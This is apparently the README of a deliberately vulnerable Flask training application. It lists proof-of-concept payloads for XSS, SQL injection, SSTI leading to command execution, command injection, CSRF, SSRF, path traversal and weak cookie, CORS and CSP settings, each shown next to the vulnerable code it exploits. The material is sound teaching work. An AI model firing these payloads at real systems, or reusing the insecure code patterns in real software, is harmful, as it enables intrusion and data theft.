# Description:
FVA Flask Vulnerable Application was developed for the purpose of learning 

# Installation

### Install via Docker
```BASH
git clone https://github.com/FIR-UIII/FVA.git
cd FVA
docker-compose up
> Open web
```

### Manual installation
```BASH
docker run --rm --name psql -e POSTGRES_DB=postgres -e POSTGRES_USER=test -e POSTGRES_PASSWORD=test -p 5432:5432 -v fva_postgres:/var/lib/postgresql/data -d postgres
git clone https://github.com/FIR-UIII/FVA.git
cd FVA
python3 -m venv {name}
source bin/activate
pip install -r requirements.txt
python3 main.py
> Open web
```

# Vulnerabilities 
brief description for some of the vulnerabilities (but not all of them)
Semgrep scan is: SemgrepSAST.txt

## XSS
##### Reflected XSS
Exploit/PoC:
```html
1. GET injection: http://{URL}/xss/reflected?param=<script>alert(1)</script>
2. HTML img injection: <img src=https://stackoverflow.com/ onerror=alert(1)>
3. JS  injection: <script>alert(document.domain)</script>
4. HTML tag injection: <a href="javascript:alert(document.domain);">click here</a>
5. Iframe injection: <iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>
6. Iframe injection:<iframe src="http://httpforever.com/></iframe>
7. Form injection:
<form name="login" action="http://ip: port/">
 	<label for="login">login: </label>
 	<input type="text" name="login" required>
 	<label for="password">password: </label>
 	<input type="password" name="password" required>
 	<input type="submit" value="Login!">
 </form>
8. Service worker injection:
<script>
window.addEventListener('load', function() {
    var sw = "/sw.js";
    navigator.serviceWorker.register(sw, {scope: '/'})
       .then(function(registration) {
            console.log('Service Worker registered successfully');
        })
       .catch(function(err) {
            console.error('Service Worker registration failed:', err);
        });
});
</script>
```

Vulnerable code:
```python
# modules/xss.py
user_input = request.args.get('param') #<-- точка ввода через query параметры xss reflected + SSTI  
return render_template('xss.html', user_input=user_input) #<-- небезопасный вывод пользователю данных без санитизации
data = request.form['user_input'] #<-- точка пользовательского ввода без валидации xss stored
```
##### DOM XSS
<b>Task 1</b>
Exploit/PoC:

```js
// DevTools
document.write('<p>Hello, ' + '<img src=x onerror=alert("cookie:"+document.cookie)>' + '! You visited this page.</p>')
```

Vulnerable code:
```js
window.onload = function() {
  var form = document.getElementById('myForm');
  form.addEventListener('submit', function(e) {
  e.preventDefault();
  // Vulnerable source *.getElementById('nameInput').value
  var userInput = document.getElementById('nameInput').value;
  // Vulnerable sink *.write with unsanitized input
  document.write('<p>Hello, ' + userInput + '! You visited this page.</p>');
  });
};
```

<b>Task 2</b>
Exploit/PoC:

```js
// Via URL
http://192.168.19.1:8888/xss/dom2?testMe=%3Cimg%20src=x%20onerror=alert()%3E
```

Vulnerable code:
```js
// Vulnerable source location.search + get
var hidden = (new URLSearchParams(window.location.search)).get('testMe');
// Vulnerable sink document.write
if(hidden){document.write('<p>'+hidden+'</p>');}
```

<b>Task 3</b>
Exploit/PoC:
```js
// DevTools
window.postMessage('<img src=x onerror=alert()>');
```

Vulnerable code:
```js
// // Vulnerable source *..addEventListener()
window.addEventListener('message', function(e) 
{
  //  Vulnerable sink *.innerHTML with unsanitized input
  document.getElementById('test').innerHTML = e.data;
})
```
## Authentication bypass
Exploit/PoC:
```
1. Go to root page "/" (logout from the current session if nessesary)
2. Open DevTools / Application / Cookies:
3. Create new with name:'user_id', value:'any_value'
4. Refresh page and profit
```

Vulnerable code:
```python
# modules/require_authentication.py
cookie = request.cookies.get('user_id') #<--значение cookie не проверяется
```

## Path traversal / Local File Inclusion
Exploit/PoC:
```
1. Open view-source http://localhost:8888/path_travers
2. Observe the path: <img src="/path_travers_img/?img=/static/scripting.png" alt="what_is_that" width="100" height="100"></p>
3. Try:
/../<your_local_file>
/README.md
/static/scripting.png
```
Vulnerable code:
```python
# modules/path_travers.py
image_path = f"{root_folder()}{file_path}" # --> dangerous command root_folder() and get user {file_path} input without validation
```

## SSTI + RCE
Exploit/PoC:
```
Go to: http://localhost:8888/ssti
Try payload:
?param={{(9*9)}}
?param={{%20config.items()%20}}
?param={{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

Vulnerable code:
```python
# modules/ssti.py
user_input = request.args.get('param', 'Введите данные в query "?param="') #<-- точка ввода через query параметры xss reflected + SSTI
return render_template_string(template) #<-- небезопасный вывод пользователю данных без санитизации
</b>'''+user_input+'''</pre> #<-- небезопасный вывод пользователю данных без санитизации
```

## XSS via Service worker
Exploit/PoC:
```
1. Go to /upload  
2. Use payload /sw.js: `setInterval(function(){console.log("U been h@cked");}, 5000);`
3. Refresh page
```

Vulnerable code:
```python
# templates/upload.html
<script>
      if (navigator.serviceWorker) {
        navigator.serviceWorker.register('/static/sw.js').then(function(registration) {
          console.log('Service Worker registered:', registration.scope);
        }).catch(function(error) {
          console.error('Service Worker registration failed:', error);
        });
      }
    </script>
# main.py
file.save(os.path.join(FVA.static_folder, filename)) #<-- user input without proper validation
```

## CSRF
Exploit/PoC:
```
1. Create phishing web server `python -m http.server`
2. Host payload /hacker_csrf.html
3. Provide to victim phishing URL (user action: click)
4. Check passwords

OR
1. Create phishing URL link http://{URL}/ssrf?url=http://localhost:8888/xss
2. Provide to victim phishing URL (user action: click)
3. Check passwords
```

Vulnerable code:
```python
# modules/csrf.py
@csrf_bp.route('/change_password', methods=['POST', 'GET']) #<-- critical actions mist be exucuted via POST request
if request.method == 'GET': #<-- critical actions mist be exucuted via POST request
new_password = str(request.args.get('new_password')) #<-- no info from fronend that this is user actions
```

## SSRF
Exploit/PoC:
```
Go to /ssrf with query param ?url=http://{URL}/xss
OR
curl -X POST -d "url=http://localhost:8888/xss" http://localhost:8888/ssrf
```

Vulnerable code:
```python
# modules/ssrf.py
if request.method == 'GET':
  url = request.args.get('url') #<--user input without proper validation
elif request.method == 'POST':
  url = request.form.get('url') #<--user input without proper validation
```

## SQL injection
Exploit/PoC:
```
Got to root '/' (logout if nessesary)
Payload to login form: `' or 1=1 --` and password `anything`
```

Vulnerable code:
```python
# main.py
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'" #<-- vulnerable to SQL injection
```

## Command injection
Exploit/PoC:
```
Go to /execute
Try to insert command `whoami` > check the result
If you are not admin > try to escalate privileges via cookie (see. Cookie misconfiguration)
```

Vulnerable code:
```python
# modules/command_injection.py
if cookie == 'YWRtaW4=': # => уязвимость в использовании статичных секретов в коде
result = subprocess.check_output(command, shell=True, text=True) # => command injection withoit validation and restriction 
```

## Security misconfiguration
#### Cookie misconfiguration
Exploit/PoC:
```
1. Go to root page "/" (logout from the current session if nessesary)
2. Open DevTools / Application / Cookies. If you login as admin you will see: value `YWRtaW4=`. Try to decode it.
Notice that there're no flags such as HttpOnly, SameSite, Secure. 
Notice that cookie has predictable value and there're no cryptography or/and entropy protection.
```

Vulnerable code:
```python
# main.py
encoded_user_id = base64.b64encode(str(result[1]).encode()).decode() # --> weak cookie protection
```

#### CORS misconfiguration
Exploit/PoC:
```
Launch local webserver like: `python -m http.server 8000`
Go to Browser DevTools > open Console > Run:
fetch('http://{URL}/api/users')
  .then(response => response.text())
  .then(data => console.log(data))
  .catch(error => console.error('Error:', error));
```

Vulnerable code:
```python
# security/CORS.py
cors = CORS(FVA, resources={
    r"/*": {
        "origins": "*", # allow any origin to request resources from site
        "methods": ["GET", "POST"],
        "headers": ["Content-Type", "Authorization"],
        "credentials": False
    }
})
```

#### CSP misconfiguration
Exploit/PoC:
```
Go to '/' 
Open Browser DevTools > open Console > Run:
fetch('{PUT ANY IMAGE}')
OR 
Load any script
```

Vulnerable code:
```python
# security/CSP.py
resp.headers['Content-Security-Policy'] = "default-src *;" \
                                               "style-src *;" \
                                               "script-src 'unsafe-inline' 'unsafe-eval'" # allow unsafe inline, eval func allow any origin '*'
```

